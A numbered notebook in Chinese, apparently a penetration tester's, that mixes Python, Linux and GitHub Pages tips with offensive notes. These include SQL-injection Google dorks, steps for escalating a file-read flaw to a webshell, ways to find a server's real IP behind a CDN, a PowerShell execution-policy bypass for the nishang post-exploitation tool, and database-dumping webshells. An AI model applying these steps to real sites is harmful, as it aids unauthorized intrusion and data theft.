    github pages在申请3xp10it.cc等域名后自动变回http,因为github检测到3xp10it.github.io已经关联到3xp10it.cc了,于
    是自动变回http,要想继续变回https,参考如下链接:
        https://sheharyar.me/blog/free-ssl-for-github-pages-with-custom-domains/
        其中的<link rel="canonical" href=" { { site.url  }  }{ { page.url  }  }" />不用加,而且http跳转到https的
        代码:
        <script type="text/javascript">
            var host = "yoursite.com";
            if ((host == window.location.host) && (window.location.protocol != "https:"))
                window.location.protocol = "https";
        </script>
        这里上面的代码不能加到_includes/head.html的开头中,要加到index.html的开头中,因为自己的index.html中有2个
        frame,与一般的index.html不同,且加到index.html中时,index.html完全代码如下:
        
        <html>
        <script type="text/javascript">
            var host = "3xp10it.cc";
            if ((host == window.location.host) && (window.location.protocol != "https:"))
                window.location.protocol = "https";
        </script>
           <frameset rows="100%,*">
            <frame src="index2.html"></frame>
            <frame src="bgmusic.html"></frame>
           </frameset>
        </html>
    
    如果发现访问不正常可去https://github.com/3xp10it/3xp10it.github.io中的setting查看错误信息

137.终端字符串生成图像工具
    banner
    figlet
    toilet
    http://blog.chinaunix.net/uid-10540984-id-2881092.html
    https://xin053.github.io/2016/07/06/pyfiglet%E5%BA%93%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/

138.bind shift+e to firefox's perference shortcut key bind
    firefox快捷键大全
        https://support.mozilla.org/en-US/kb/keyboard-shortcuts-perform-firefox-tasks-quickly

139.制作pypi的python模块(eg.exp10it.py)时,在本地如果exp10it.py中有中文,在一个正常的py文件中如果有一句
    from exp10it import *,如果这个正常的py文件中由于这句导入了相同文件夹目录下的exp10it.py模块,会由于其中的中文
    而产生错误,可以上传到pypi后由pip install安装exp10it模块后使用from exp10it import *,同时需要删除同目录下的
    exp10it.py文件,否则from exp10it import *依然会优先从同目录下找exp10it.py模块

140.sqlmap得出经验,一般跑出只有盲注的uri注入点,一般都是由于waf拦截了普通的union注入语句,只要想办法绕过waf就可以
    用union来快速注入了,否则只能用sqlmap跑出来的盲注payload进行慢慢的注入,且有可能不能注入出所有数据,依然被waf拦截

151.python模块中声明编码为utf-8的注释代码不用放在前两行,如果出错,说明代码其他地方有误

152.compiz和unity的问题:
    dconf reset -f /org/compiz
    setsid unity
    unity --reset-icons

    another:
    cd 
    rm -rf .config/apps/compiz*
    rm -rf .cache/compizconfig-1
    rm -rf .config/compiz-1
    rm -rf .compiz
    
    tip:
    1.ccsm命令行启动compiz管理工具
    2.ubuntu主题
        http://www.linuxdiyf.com/linux/20684.html
    3.ubuntu16.04中按alt+d不直接定位到浏览器url中解决方法:
    http://askubuntu.com/questions/449793/alt-key-for-hud-conflict
    super+d不能到桌面方法:
        1.ctrl+super+d(ubuntu内置)
        2.ccsm
            http://www.kuqin.com/shuoit/20120506/320402.html
        3.ubuntu 16.04 super+d切换到桌面的方法,在系统的键盘设置中取消导航中的隐藏所有窗口的super+d的快捷键,打开
          compizconfig settins manager,搜索unity,找到显示桌面的快捷键设置处,设置为super+d

          上面2中无效时用3有效
    本机出现窗口没有"关闭,最小化"等解决方法:
        打开compiz设置在窗口管理处勾选"放置窗口"

153.linux清理:
    1>apt-get autoremove
    2>apt-get autoclean
    3>apt-get clean
    4>dpkg -l |grep ^rc|awk '{print $2}' |sudo xargs dpkg -P(一键删除残余配置文件)

154.ubuntu audio:http://forum.ubuntu.org.cn/viewtopic.php?t=324619

156.pip install exp10it -U出现无法立刻升级处理办法:pip install exp10it=(local_latest_version)

157.grep多行匹配:(eg.匹配exp10it.py中的api)
    pcregrep -M 'def .*(.*):\n(.*#.*\n){1,10}'

158.linux下vmware中有一台机器止住导致其他虚拟机也无法进入解决方法:
    ps -aux | grep "vmware"
    kill pid_of_error_machine

159.google dock:
    http://waziristanihaxor.blogspot.hk/2015/03/5000-fresh-google-dorks-list-for-sql.html
    inurl:"php"|"php page="|"php id="|"php tid="|"php pid="|"php cid="|"php path="|"php cmd="|"php file="|"php cartId="|"php bookid="|"php num="|"php idProduct="|"php ProdId="|"php idCategory="|"php intProdID="|"cfm storeid="|"php catid="|"php cart_id="|"php order_id="|"php catalogid="|"php item="|"php title="|"php CategoryID="|"php action="|"php newsID="|"php newsid="|"php product_id="|"php cat="|"php parent_id="|"php view="|"php itemid=" site:www.facebook.com
    site:xxx.xxx.xxx inurl:union select
    site:xxx.xxx.xxx intext:warning|error|syntax|incorrect|unexpected|occurred|command|execute

160.my own github's md file:
    每行111个字节长度,但是写md时并不用在vim中设置111个字节长度后自动换行,因为md文件会在应该换行的时候自动换行,只要将一段的内容写到md文件中的一行中即可

161.echo $HISTCONTROL,如果结果为ignoreboth,执行命令时先加空格再输入命令则history不会记录

162.github-pages 使用多说
    http://www.ituring.com.cn/article/114888

163.windbg调试命令详解:
    http://www.yiiyee.cn/Blog/windbg/
    http://www.cppblog.com/weiym/archive/2012/06/07/177958.aspx
    db esi:查看esi地址中的内容
        db 400000:查看0x400000处的内容,db按字节大小查看,dd按DWORD类型查看
    !address edi:显示edi地址处的内存状态,信息
    lmm mso v:匹配mso模块,并显示详细信息
    bp eax:在eax处下断点,支持第几次经过后中断,支持中断后执行命令
    g:让被调试的程序继续运行(f5)
        gh:把异常标识为已处理并断续执行程序
        go:对异常不进行任何处理并继续执行程序
    kb:显示传递给堆栈回溯中的每个函数的前三个参数
        kp:显示传递给堆栈回溯中的每个函数的所有参数
    ub mso!Ordinal1273+0x2581:反汇编mso!Ordinal1273+0x2581地址之前的代码
        uf test!main:反汇编test!main函数
    p:单步步入step into(f11)
    t:单步步过step over(f10)
    ? ebp-edi:显示表达式ebp-edi的值
        ?? expression:显示c++表达式的值
    .cls:清屏

164.firefox好用的一个翻译附加组件:
    S3.Google Translator

165.firefox的vimperator插件使用:
    http://wangbixi.com/x2923/comment-page-1/
    http://pchu.blogbus.com/
    http://luoxiqofy.blogbus.com
    http://www.cnblogs.com/flywuya/archive/2010/12/29/1920485.html

166.恶意文档分析技巧及工具快速参考
    http://wenku.baidu.com/link?url=m7GL0Q9W8Pei47frvTquIe9pAgKejBtPesAwZFiClOAEHK23ZF5xRxqA8eowV6e1HiKscwjxIWNOFRC3ep78yFurtSN5L0ZjQ0gV4uu72Lq

167.ubuntu安装java
    http://www.linuxdiyf.com/linux/21071.html

168.文件下载或文件读取漏洞思路:
    1>读数据库连接文件
    2>尝试连接数据库
        a>是否支持数据库外连
        b>是否有phpmyadmin(扫目录)
            select ... into dumpfile ...
                如果不知道写shell路径,可从phpmyadmin中找找数据库中存在的路径,实战中找到过phpmyadmin的web页面的路径
            如果不能写文件则通过查看数据库中的管理员用户名密码进后台上传shell
            或者用数据库中的其他密码尝试连接ftp
            或者如果数据库中有editor的setting,修改为可以上传php
    3>尝试读取到ftp配置文件,尝试用数据库用户名密码连接ftp
    4>代码审计

169.www.gnu.org上可以下载linux系统自带的工具,eg.find工具

170.discuz漏洞扫描工具
    dzscan
    https://github.com/code-scan/dzscan

171.windbg中找不到symbol路径解决方法:
    .sympath srv*c:symbols*http://msdl.microsoft.com/download/symbols
    .reload /f

172.《深入理解计算机系统》读书参照
    http://wdxtub.com/2016/04/16/thin-csapp-0/
    http://www.voidcn.com/blog/zym0017d/article/p-540879.html

173.实用的搜索引擎
    http://kaopu.so/

174.awk实用指南
    http://awk.readthedocs.io/en/latest/chapter-one.html

175.ssrf相关
    http://evilcos.me/?p=221

176.find查找最近的文件:
    find / -amin -10 # 查找在系统中最后10分钟访问的文件
    find / -atime -2 # 查找在系统中最后48小时访问的文件
    
    find / -mmin -5 # 查找在系统中最后5分钟里修改过的文件
    find / -mtime -1 #查找在系统中最后24小时里修改过的文件76

177.php数组键值对
    http://www.cnblogs.com/coderchuanyu/p/3904711.html

178.快速查看webshell大马是否含有后门:
    firebug|网络,如果看到访问大马时还有其他可疑访问uri,说明有后门

179.pyc文件相当于pyhton文件的缓存,如果import了某个模块后在目录下生成了pyc文件,就算这个刚才被import的py模块被删
    除了,但是由于pyc文件还存在,仍然可以import 该模块

180.python查看模块中有哪些函数(dir()用法)
    http://www.iplaypython.com/jichu/dir.html

181.python多线程中使用multiprocessing.pool参数为多个的使用方法
    http://stackoverflow.com/questions/4474940/unsupported-operand-types-exception-with-threappool-map-but-not-map

    from multiprocessing.dummy import Pool as ThreadPool
    pool=ThreadPool(20)
    使用map和map_async:
        pool.map() vs pool.map_async
        map是阻塞的,要等到map里面的列表中的所有
        相应文档:
            https://docs.python.org/2/library/multiprocessing.html(英文)
            http://python.usyiyi.cn/translate/python_278/library/index.html(中文)
            中文不详尽,英文中说到multiprocessing.dummy就是multiprocessing的复制版本,只不过multiprocessing.dummy
            作用于线程
            "multiprocessing.dummy replicates the API of multiprocessing but is no more than a wrapper around
            the threading module."
            所以参考multiprocessing的api来使用操作线程池即可

            https://mugglecoding.gitbooks.io/qa/content/poolzen_yao_shi_yong.html

            pool.close()
                防止任何更多的任务(其他没有安排过的任务,map过的任务不属于这个范围)被提交到线程池中.一旦所有的任
                务已经完成了工作线程将退出.
            pool.terminate()
                立即停止线程池中的工作线程(无论任务有没有完成),经测试并不能停止所有的线程池中要进行的任务,应该
                是只能停止当前正在执行的一个函数过程(子线程)

                为了停止线程池中的所有线程,尤其是在爆破密码时,某一个线程已经爆破成功,为了达到"停止其他的将要执
                行的通过map加入到pool线程池中的任务"相同的效果,在每个线程中的开头判断是否已经爆破成功,成功则直
                接return,不成功则继续本线程应该完成的工作
            pool.join()
                等待线程池中的工作线程退出,必须先使用pool.close()或者pool.terminate()才能调用join()

182.cms在线识别
    http://whatweb.bugscaner.com/

183.Netifera(域分析神器)

184.渗透图
    http://images0.cnblogs.com/blog2015/640760/201506/121255389739630.png
    http://www.e-wolf.top/content/uploadfile/201608/0f9f1471011328.jpg

185.python函数嵌套时在内层函数中操作外层函数的变量,不使用全局变量的方法
    http://www.crifan.com/python_access_parent_nesting_function_local_variable_from_nested_function/

186.python使用mechanize进行web交互(可列表单,填表单,提交表单,使用代理等很方便)
    http://blog.csdn.net/jeanphorn/article/details/46917159
    http://blog.chinaunix.net/uid-26722078-id-3507409.html

187.python显示进度条方法
    http://www.111cn.net/phper/python/66812.htm

188.python中https访问认证失败解决方法:
    http://bookshadow.com/weblog/2015/04/22/sae-python-weibo-sdk-certificate-verify-failed/

189.python中sys.stdout模块
    http://www.cnblogs.com/turtle-fly/p/3280519.html
    a. print "something"   相当于sys.stdout.write("something\n")
    b. print "something",  相当于sys.stdout.write("something")

    没有换行的print或sys.stdout.write()都不会立即打印出来,需要遇到有换行的地方才会显示,或者没有遇到换行只能在
    程序运行结束后强制显示,也即b中的方法不会打印出内容到终端,加sys.stdout.flush()才可以马上显示,或者遇到下面的
    print有换行功能,或者程序结束才会打印出来

190.查看python模块文档
        python -m pydoc -p 500
    python官方文档中文站
        http://python.usyiyi.cn/translate/python_278/library/index.html
    python官方英文文档
        https://docs.python.org/2.7/

    上面不能查看到的信息,eg. sys.stdout有哪些函数?方法如下:
        python
        import sys
        dir(sys.stdout)
        sys.stdout.__doc__
            可以看出sys.stdout是个文件对象
            文件对象的操作http://my.oschina.net/u/2252538/blog/332757
        sys.stdout.truncate.__doc__
        sys.stdout.close.__doc__
        ...

191.快速查看windows是32|64位
    dxdiag

192.python在一行打印的方法
    eg.
    PASSWORD=password+(50-len(password))*" "
    sys.stdout.write('-'*(try_time[0]/(sum[0]/100))+'>'+str(try_time[0]/(sum[0]/100))+'%'+' %s/%s %s\r' % \
    (try_time[0],sum[0],PASSWORD))
    sys.stdout.flush()
    其中password长度是变化的,使用print "\b"或sys.stdout.write("\b")想达到退格的效果无果后,考虑到的技巧:声明好
    一个尾部是空格串的PASSWORD,将动态变化的password放入PASSWORD的最前面,这样就是每次在同一行打印长度不变的字符
    串了,就不会由于password由长变短后突出的长的尾巴不能用退格清除而烦恼了

193.python中打开文件可以用with open() f的方式来打开文件:
        with open(r'user.dic', 'r') as fUser:  # 使用with as 来打开文件,不需自己关闭文件,因为他会自己在合适的时
        候自已关闭(类似C# 中的using(...){}接口)

194.windows下bat对指定日期内的文件的操作
    http://www.111cn.net/sys/Windows7/81187.htm

195.css中加载本地不存在的外部字体时,用@font-face,@font-face要写在css文件的开头(全局可用)的位置,不能写在局部的
    css属性里面
	在线中文字库:
		www.youziku.com
		文泉驿等宽正黑:http://www.youziku.com/webfont/index/259

196.验证码识别
    http://www.polarxiong.com/archives/python-pytesser-tesseract.html
    google的pytesser模块2007年的,放弃使用,直接自己调用tesseract达到识别验证码功能

197.pip install exp10it --upgrade无法立即更新解决方法:
    pip install exp10it --upgrade --allow-external=exp10it --allow-unverified=exp10it
    不行尝试删除本地exp10it.pyc?
    pip install exp10it --upgrade --no-cache-dir

198.python的tab键raw_input()文件路径自动补全
    https://gist.github.com/iamatypeofwalrus/5637895

199.command 1>/dev/null 2>/dev/null &
    1>/dev/null表示将命令的标准输出重定向到/dev/null
    2>/dev/null表示将命令的错误输出重定向到/dev/null
    &表示后台执行,你可以继续占有你的输入窗口

200.python时间输出格式化
    http://blog.csdn.net/qq61394323/article/details/44620699

201.python的可变参数
    http://blog.csdn.net/huangkangying/article/details/34508961

202.python全局变量
    (不同文件模块间的变量共享)
    http://www.51testing.com/html/49/101349-815499.html

203.vim中匹配\要写成\\\
    python中匹配\要写成re.search(r"\\")
    在正则替换时换行符要写成\r
    eg.在整理当前notes时的替换命令如下:
    :%s/\v\n+\s*\n*^(\d+\.)/\r\r\1/g
    其中替换成\r表示换行,替换之后这个\r其实是\n,可被\n在正则查找时匹配到

204.python中MySQLdb模块操作
    http://www.jianshu.com/p/76fab6cb06f9
    http://www.jb51.net/article/57290.htm
    官方api
        http://mysql-python.sourceforge.net/MySQLdb-1.2.2/
    python代码中有时update语句会阻塞无法执行是因为update中操作的表可能被锁住了,超时后报如下错误:
        1205, 'Lock wait timeout exceeded; try restarting transaction'
    解决办法:将其他可能导致对update语句中的表锁住的进程操作kill掉,eg:show processlist,kill -9 python
        http://blog.sina.com.cn/s/blog_53e68b3b0101bjxi.html
    动态创建数据库,表(可创建数据库--->选择数据库--->建表)
        http://blog.csdn.net/chichoxian/article/details/38224361

205.ssh端口转发
    http://www.ruanyifeng.com/blog/2011/12/ssh_port_forwarding.html
    ssh反向代理
    正向代理是指内网一台机器借助一台代理机器上网,所以反向代理是外网机器借助一台代理机器访问内网
    https://segmentfault.com/a/1190000002718360

206.文件恢复py
    https://sourceforge.net/projects/easypythondecompiler/?source=typ_redirect
    http://www.yihaomen.com/article/python/515.htm
    http://zqpythonic.qiniucdn.com/data/20100910175015/index.html
    http://tool.lu/pyc/

207.insert into经常遇到的duplicate key entry...的解决:
    http://blog.csdn.net/i10630226/article/details/51759701
    insert into vs insert ignore into
        http://www.111cn.net/database/mysql/56643.htm

208.python数据库中文乱码尝试解决
    http://fc-lamp.blog.163.com/blog/static/174566687201210285137981/

209.python中的print和sys.stdout.write:
    sys.stdout是一个文件句柄,默认缺省值是终端输出,如果这样:
        sys.stdout=open('file.txt','w')
    那么sys.stdout这个文件句柄就不再是指向终端输出了,而是指向文件file.txt了
    这个时候没有办法找到终端输出了,要想在sys.stdout=open('file.txt','w')[也即重定义句柄指向的文件后]还能找到终端输出的句柄,方法如下:
        tmp=sys.stdout
        sys.stdout=open('file.txt','w')
        print ...(or sys.stdout.write(...))-->将内容写到file.txt
        sys.stdout=tmp--->重新找到终端输出的句柄

210.python中raw_input和print共存方案:
    http://stackoverflow.com/questions/2082387/reading-input-from-raw-input-without-having-the-prompt-overwritten-by-other-th

211.python3中MySQLdb不支持python3的解决:
    http://blog.csdn.net/foryouslgme/article/details/52154152

212.linux后台前台任务切换
    command&:让进程在后台运行
    jobs:查看后台运行进程
    fg %n:让后台运行的进程n到前台来
    bg %n:让进程n到后台去
    ctrl+z:将前台在执行的命令放到后台并暂停
    n指的是jobs命令中的编号

213.mysql不支持select top n column_name from ...,用select ....limit n(m,n)代替

214.php在线加密
    http://www.phpjiami.com/phpjiami.html

215.火车票购买时间
    提前60天,早上7点到7:30,中午12点,晚上10-11点,发车前1-2天,买区间票先上车

216.install/uninstall vim8
    http://tipsonubuntu.com/2016/09/13/vim-8-0-released-install-ubuntu-16-04/

217.python代码格式化工具,autopep8,pycodestyle用来检查代码是否有不规范的格式
    usage:https://pypi.python.org/pypi/autopep8
    autopep8 --in-place --aggressive --aggressive file
    autopep8 -i -a -a file
    autopep8 -i -a -a --range 10 20 file
    
    maybe better from google:
        https://github.com/google/yapf
        pip install yapf
    暂时认为autopep8更好

218.ubuntu16.04安装npm
    http://www.jianshu.com/p/1016f79a443f

219.html织网背景js
    https://github.com/hustcc/canvas-nest.js

220.scrapy教程
    http://scrapy-chs.readthedocs.io/zh_CN/0.24/intro/tutorial.html
    中文翻译http://scrapy-chs.readthedocs.io/zh_CN/latest/
    scrapy传递除response以外的参数到parse:
        https://www.zhihu.com/question/54773510
        https://doc.scrapy.org/en/latest/topics/request-response.html#topics-request-response-ref-request-callback-arguments

221.burpsuite中的四种attack爆破模式
    https://portswigger.net/burp/help/intruder_positions.html
    http://www.freebuf.com/articles/5560.html
    sniper:
    轮流在每个position处遍历一个payload列表里的所有payloads,每次只有一处position是变量(一个payload列表)
    battering ram:
    多个position处同时遍历一个payload列表里的所有payloads,每次每个position处的值相同(一个payload列表)
    pitchfork:
    多个position处同步遍历多个payload列表里的所有payloads,每次每个position处的值不同,且平行遍历各自的
    payload列表中的值(一个或多个payload列表)
    cluster bomb:
    每个position处的值各自遍历自己所属的payloads列表,且不平行遍历,相当于排列组合,如爆破username:password时用这
    个爆破(一个或多个payload列表)

222.符号执行,污点分析
    http://jst.tsinghuajournals.com/CN/rhhtml/20160105.htm
    http://cdmd.cnki.com.cn/Article/CDMD-10248-1011268430.htm

223.在线社工库
    http://s.70sec.com/
    测试是否泄露:https://haveibeenpwned.com/

224.猜想
    1)sqlmap中如果检测到可能有注入但是最后没有成功注入时,可能是这个注入需要构造特殊数据才可成功注入,而sqlmap不
    会自动构造特殊数据,如insert into注入时,insert的字段数为多个,当sqlmap构造的数据在当前的字段构造完之后,当前字
    段后面的字段需要构造为'',''等,这里需要看看详细报错信息,看看是哪个地方要构造怎样的数据,可用awvs扫描,http
    fuzzer可观察详细数据后自行尝试构造

225.在线目录扫描器
    https://pentest-tools.com/website-vulnerability-scanning/discover-hidden-directories-and-files

226.colorama输出彩色文字用法
    from colorama import init,Fore
    init(autoreset=True)
    print(Fore.RED+target)

227.scrapy框架
    http://blog.fishc.com/4015.html

228.NS记录,A记录,CNAME记录,MX记录
    NS记录:解析服务器记录
    A记录:ip指向记录
    CNAME记录:别名指向记录
    MX记录:邮件交换记录
    优先级:
        NS>A>CNAME
    http://blog.csdn.net/crazw/article/details/8986581

229.wordpress注册uri
    wp-login.php?action=register

230.绕过cdn查找真实ip
    http://77mq.com/2016/05/16/%E5%86%8D%E8%AE%BA%EF%BC%9Acdn%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9Eip%E6%96%B9%E6%B3%95%E3%80%81%E4%BA%91%E5%8A%A0%E9%80%9F%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9Eip%E6%96%B9%E6%B3%95%E3%80%81cdn%E9%80%86/
    http://blog.sina.com.cn/s/blog_60a4fcef0102v310.html
	https://www.zhihu.com/question/37103396
    相关在线查询
            CloudFlare专用查询真实ip:http://www.crimeflare.com/cfs.html
            https://www.sunnyhoi.com/2016/07/07/how-to-find-real-ip-address-website-behind-cloudflare/
            https://censys.io
                -cE
                提供api接口
                    https://censys.io/account有api key
                    https://censys.io/api有api帮助文档

            http://whoisrequest.com/history/
            http://www.sameip.org
            

            http://viewdns.info/iphistory
            http://dnstrails.com/
            
            http://ping.chinaz.com
            http://ping.aizhan.com
            https://asm.ca.com/en/ping.php

    eg.www.baidu.com
    ping baidu.com

    关于找真实ip:
    实例:
    a>
    3xp10it.cc在domain server中设置一条cname记录为3xp10it.github.io;
    b>
    或是ping 3xp10it.github.io得到的ip地址为A记录;
    c>
    容易通过http://ping.chinaz.com查到上面的3xp10it.github.io对应的ip有多个,且是cdn,说明这是github.io官方购买的
    cdn;
    d>
    在CloudFlare官网注册免费的cdn解析服务,过程中会先识别出3xp10it.cc的cname记录和A记录,由于在域名服务商的后台
    中没有添加A记录,所以在CloudFlare中只识别出了cname记录,也即3xp10it.cc--->3xp10it.github.io,然后CloudFlare要求
    在域名服务商的管理控制后台将注册的3xp10it.cc域名的dns由默认的dns9.hichina.com修改成CloudFlare提供的dns服务器
    的域名xxx.cloudflare.xxx,说明在CloudFlare官网注册时,将3xp10it.cc的cname记录添加到CloudFlare的dns的解析列表
    了,这样访问3xp10it.cc时就会由CloudFlare dns解析成3xp10it.github.io(3xp10it.cc的cname记录值),如果在域名服务
    商中添加了A记录,CloudFlare则会将3xp10it.cc优先解析成3xp10it.cc的A记录的ip值
    e>
    而上面的CloudFlare专用查询真实ip的链接-->http://www.crimeflare.com/cfs.html查询的应该是CloudFlare对应的解
    析的值,也即3xp10it.github.io,而这显然不是真实ip,因为它是github购买的cdn,说明上面的CloudFlare专用查询真实ip
    的链接也只能查到前一层的"真实ip",而这在用了多个不同cdn产品情况下并不一定是真正的真实ip,所以查找真实ip的过程
    如下:
    eg.查找www.baidu.com的真实ip
    ff>dig baidu.com ns +short 如果找到 cloudflare则送到CloudFlare专用查询真实ip链接中,如果查询失败或者不是
    CloudFlare则下一步
    -1>如果上面的ns记录的结果中没有cloudflare而有baidu.com的子域形式的域名,则查ns记录对应ip,扫c段,改hosts,可正
    常访问得到对应页面则认为是真实ip
    0>如果用在获取旁站时,首先要判断有没有cdn,由这个网站判断http://ping.chinaz.com,发现有cdn
    1>info.php|phpinfo.php|test.php|l.php试探,发现不存在这样的页面
    2>http://dnstrails.com/查看最早的A记录中在0中链接不是cdn的ip,将hosts文件修改成ip domain格式,如果可以正常访
    问得到对应页面,则认为是真实ip
    3>查ns和mx记录对应的ip,扫c段,改hosts文件,可正常访问得到对应页面则认为是真实ip
      CloudFlare中有这样一句:
           Some records, like MX, never go through CloudFlare (no cloud).
    4>子域爆破,扫c段,改hosts文件,可正常访问得到对应页面则认为是真实ip
    5>上面没有找到,直接查找a记录,找出不是cdn的ip,改hosts文件,可正常访问得到对应页面则认为是真实ip

231.子域在线查询
    http://i.links.cn/subdomain/

232.css好样
    http://tools88.com/

233.查看乌云知识库和社区文章
    http://web.archive.org/web/*/http://drops.wooyun.org
    http://web.archive.org/web/*/http://zone.wooyun.org

234.github域名解析相关(aliyun 万网 && github pages)
    http://nag24.org/posts/programming/2016/05/26/Github-Pages%E7%BB%91%E5%AE%9A%E9%98%BF%E9%87%8C%E4%BA%91-%E4%B8%87%E7%BD%91-%E7%94%B3%E8%AF%B7%E7%9A%84%E5%9F%9F%E5%90%8D/
    https://help.github.com/articles/setting-up-an-apex-domain-and-www-subdomain/
    http://www.jianshu.com/p/7edd1351bb5f
    http://blog.wengyingjian.com/2015/12/29/Jekyll-bind-site/
    http://www.jianshu.com/p/3bb5f1eac51b

    github.CNAME:3xp10it.cc
    domain server:cname www 3xp10it.github.io
    不解析

    github.CNAME:www.3xp10it.cc
    domain server:cname www 3xp10it.github.io
    解析

    github.CNAME:3xp10it.cc
    domain server:cname @ 3xp10it.github.io
    解析

    github.CNAME:3xp10it.cc
    domain server:A @ 151.101.100.133
    解析

    github.CNAME:3xp10it.cc
    domain server:cname @ 3xp10it.github.io.
    解析

    github.CNAME:3xp10it.cc
    domain server:cname @ riusksk.github.io
    成功解析,其中riusksk.github.io是另外一个人的github博客主页
    riusksk.github.io和3xp10it.github.io的ip一样,都是github用的cdn

    github.CNAME:3xp10it.cc
    domain server:cname @ www.baidu.com
    不解析

    
    dig cname 3xp10it.cc +short @dns9.hichina.com时
    在aliyun 万网里面设置cname @ domain格式(没有加A记录)时有如下情况:
    (无论在aliyun 万网里面设置的cname @ domain=3xp10it.github.io或是
    domain=3xp10it.github.io.都是下面的结果)
    其中dns9.hichina.com是aliyun 万网的dns
    结果为:3xp10it.github.io.
    但是如果用这个命令:
    dig cname 3xp10it.cc +short 8.8.8.8
    结果不是3xp10it.github.io.而是设置成3xp10it.github.io之前的设置的其他值,过几分钟后dig cname 3xp10it.cc
    +short 8.8.8.8才显示结果是3xp10it.github.io.
    试着用一个大的dns列表再去逐个解析(查询)3xp10it.cc的cname记录值:

235.ubuntu设置dns
    http://www.ahlinux.com/ubuntu/23267.html

236.mx记录与邮件发送的关系
    http://www.cszhi.com/20110910/mx_relay.html
    邮件原理
        http://www.178linux.com/7049

237.ubuntu16.04 dns cache flush
    /etc/init.d/dns-clean start
    /etc/init.d/networking force-reload

238.3xp10it.cc的解析
    old:
    CNAME @ 3xp10it.github.io.
    new:
    A @ 151.101.16.133        
        这条是为了exp10it.cc可以访问到3xp10it.github.io(这里不用CNAME记录是因为用CNAME记录
        当主机记录为@时会和下面的mx记录冲突,用A记录可避免冲突)
    A www 151.101.16.133    这条是为了www.3xp10it.cc可以访问到3xp10it.github.io
    mx @ mxbiz1.qq.com 5
    mx @ mxbiz2.qq.com 10

239.黑色背景下文字配色
    http://www.tedmontgomery.com/tutorial/clrctgBL.html

240.liquid语法
    https://shopify.github.io/liquid/basics/introduction/
    http://www.codes51.com/article/detail_102735.ht

241.liquid一次循环对文章年月排序:(其中的`added`是人为添加的,如果不添加将被执行,即使在一对3个反引号之间)
	{`added`% for post in site.posts %`added`} {`added`% capture y %`added`}{`added`{post.date | date:"%Y"}}`added`{`added`% endcapture %`added`} 
        {`added`% if year != y %`added`} 
        {`added`% assign year = y %`added`}
        {`added`{ y }`added`}<br>
        {`added`% endif %`added`}

        {`added`% capture m %`added`}{`added`{ post.date | date:"%m" }`added`}{`added`% endcapture %`added`}
        {`added`% if month != m %`added`}
        {`added`% assign month = m %`added`}
        {`added`{ month }`added`}<br>
        {`added`% endif %`added`}

    <a href="{`added`{ post.url | prepend: site.baseurl }`added`}">{`added`{ post.date | date:"%Y-%m-%d" }`added`} {`added`{ post.title }`added`}</a><br>
	{`added`% endfor %`added`}

242.python用于捕获ctrl+c的键盘事件:
	i=0
	try:
		while True:
			print(i)
			i=i+1
	except KeyboardInterrupt:
		print("you input ctrl+c")

242.vim匹配正则删除行
	http://blog.csdn.net/joeblackzqq/article/details/7399019
	删除包含kernel32的行
	:g/kernel32/d

	保留包含kernel32的行
	:g!/kernel32/d

243.在exp10it模块中,python3中由2to3将class MyThread中的apply换成了self.func(*self.args),python3中如果传入参数到
MyThread类中的函数时,只有一个参数时要用[]括起来,不能用()括起来,会报错,多个参数好像可以用()括起来,在xwaf.py中有
相关使用

244.docker
	http://kb.cnblogs.com/page/536115/
    docker加速:
        https://www.daocloud.io/mirror#accelerator-doc

245.php脱库用1337.php,aspx脱库用spyaspx

246.nishang用法
	http://resources.infosecinstitute.com/nishang-a-post-exploitation-framework/
	Powershell.exe –exec bypass –Command "& {Import-Module 'C:\Users\User\Desktop\temp\Check-VM.ps1'; Check-VM}"

	detail:
	eg.portscan:
	Set-ExecutionPolicy remotesigned[开启ps可执行]
	import-module .\Invoke-PortScan.ps1
	Invoke-PortScan -StartAddress 192.168.3.1 -EndAddress 192.168.3.254 -ResolveHost -ScanPort 

247.reGeorg无法连接时,net stop + taskkill /F /IM 把可疑进程结束掉就可以连接了

248.ps1无法执行时,解决方法:
	administrator->powershell->执行Set-ExecutionPolicy RemoteSigned

249.特殊字符的echo
	http://stackoverflow.com/questions/7308586/using-batch-echo-with-special-characters

250.坑:
	a)windows下的for命令读文件时,如果文件是unicode编码读不出来,要改成ansi
    b)python读文件以"a+"模式打开时要先f.seek(0)再r.read(),否则读不到内容

251.python转成exe
	https://mborgerson.com/creating-an-executable-from-a-python-script
	pyinstaller.exe --onefile --windowed app.py

    py2exe逆向支持混淆 pyc:
    https://www.fireeye.com/blog/threat-research/2016/05/deobfuscating_python.html

252.使用charles抓菜刀或其他exe的网络通信数据方法:
	proxifier里面设置菜刀的代理为charles提供的代理地址

253.oracle手工注入
	http://www.freebuf.com/articles/web/5411.html
	http://www.hackdig.com/?01/hack-394.htm
	http://gdhtruiplkj.blogspot.kr/2013/05/oracle.html

254.判断一个可能存在cdn的domian是http还是https:
	不连接vpn访问http://{domain}无法访问,访问https://{domian}却可以访问,这样的情况下可能是这个domain被GFW拦截了
	.这样的话用exp10it.py模块中的get_http_or_https会得到是https
	连接vpn访问http://{domain}可以正常访问,访问https://{domain}也可以正常访问,这样的情况下可能是cdn强制给
	domain加的https[eg.cloudflare].这样的话用exp10it.py模块中的get_http_or_https会得到http
	因此,在尝试获取domain的cdn背后的真实ip时,exp10it.py模块中的get_http_or_https可能因此而受干扰[GFW+cdn]
	因此,修改exp10it.py模块中的get_http_or_https函数,先用baidu[site:{domain}]这样查一下对方是http还是https,如果
	得不到再用原来get_http_or_https的方法继续

255.python打包代码setup.py文件
	http://blog.useasp.net/archive/2014/09/09/packaging-python-libraries-and-upload-to-pypi-python-package-index.aspx

256.pip install 无法安装最新python包的时候试试把当前terminal关掉然后新开terminal再pip install

257.python打包模块上传时,打包其他文件夹或文件:
	新建MANIFEST.in文件,eg.内容如下[graft是包含文件夹]
		include *.md
		graft cms_identify
		graft dicts
		graft exps
	但是这样包含的文件夹虽然会上传到pypi中,但是pip install moduleName时在MANIFEST.in中的文件夹不会被安装到系统
	dist-packages中,如果需要在pip install命令后将文件夹也安装到dist-packages中则需要在setup.py中的packages参数
	中填写上面的三个文件夹名

258.眼保健操
	1>太阳穴(食指)
	2>上眼眶
	3>下眼眶
	4>风池穴(食指+中指,后颈凹处)
	5>揉耳眶

259.django教程
	http://www.ziqiangxuetang.com/django/django-tutorial.html
